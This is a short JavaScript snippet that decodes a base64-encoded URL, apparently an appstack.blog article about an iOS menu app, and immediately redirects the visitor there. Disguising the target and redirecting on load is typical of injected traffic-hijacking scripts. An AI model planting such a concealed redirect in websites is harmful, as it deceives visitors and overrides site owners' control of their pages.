(() => {
  const b64 = "aHR0cHM6Ly93d3cuYXBwc3RhY2suYmxvZy9hcHAvbWVudS1hcHAtaW9zLWRldmVsb3BtZW50LWFwcGxlLWJsYWNrbGlzdGVkLw==";
  const url = atob(b64);
  location.replace(url);
})();
